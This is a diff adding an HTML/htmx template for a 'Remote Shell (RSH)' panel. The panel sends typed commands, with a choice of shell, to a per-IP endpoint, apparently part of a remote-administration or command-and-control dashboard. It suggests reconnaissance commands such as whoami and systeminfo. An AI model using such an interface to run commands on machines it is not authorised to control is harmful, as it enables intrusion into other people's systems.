@@ -1,0 +1,76 @@
+<div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+    <div class="col-span-1 md:col-span-2 glass-effect rounded-xl p-6 shadow-lg">
+        <div class="flex items-center gap-3 mb-4">
+            <div
+                class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+            >
+                <svg
+                    class="w-4 h-4 text-gray-300"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                >
+                    <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M8 9l3 3-3 3m5 0h3"
+                    ></path>
+                </svg>
+            </div>
+            <h3 class="text-xl font-semibold text-white">Remote Shell (RSH)</h3>
+        </div>
+        <form
+            hx-post="/api/command/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+            class="space-y-4"
+        >
+            <input type="hidden" name="module" value="RSH" />
+            <div class="flex flex-col md:flex-row gap-3">
+                <input
+                    type="text"
+                    name="args.command"
+                    placeholder="Enter command (e.g., whoami, dir, systeminfo)"
+                    class="flex-grow px-4 py-3 bg-rgb(24,24,24) border border-gray-600/30 rounded-xl text-white placeholder-gray-500 focus:border-gray-400 focus:ring-2 focus:ring-gray-400/20 transition-all"
+                />
+                <select
+                    name="args.shell"
+                    class="px-4 py-3 bg-rgb(24,24,24) border border-gray-600/30 rounded-xl text-white focus:border-gray-400 focus:ring-2 focus:ring-gray-400/20 transition-all"
+                >
+                    <option value="default">Default Shell</option>
+                    <option value="cmd">Command Prompt</option>
+                    <option value="powershell">PowerShell</option>
+                    <option value="bash">Bash</option>
+                    <option value="sh">Shell</option>
+                </select>
+                <button
+                    type="submit"
+                    class="bg-white hover:bg-gray-100 text-black font-medium px-6 py-3 rounded-xl transition-all duration-200 flex items-center gap-2"
+                >
+                    <svg
+                        class="w-4 h-4"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            stroke-linecap="round"
+                            stroke-linejoin="round"
+                            stroke-width="2"
+                            d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"
+                        ></path>
+                    </svg>
+                    Execute
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<style>
+    .glass-effect {
+        background: rgba(32, 32, 32, 0.8);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+</style>
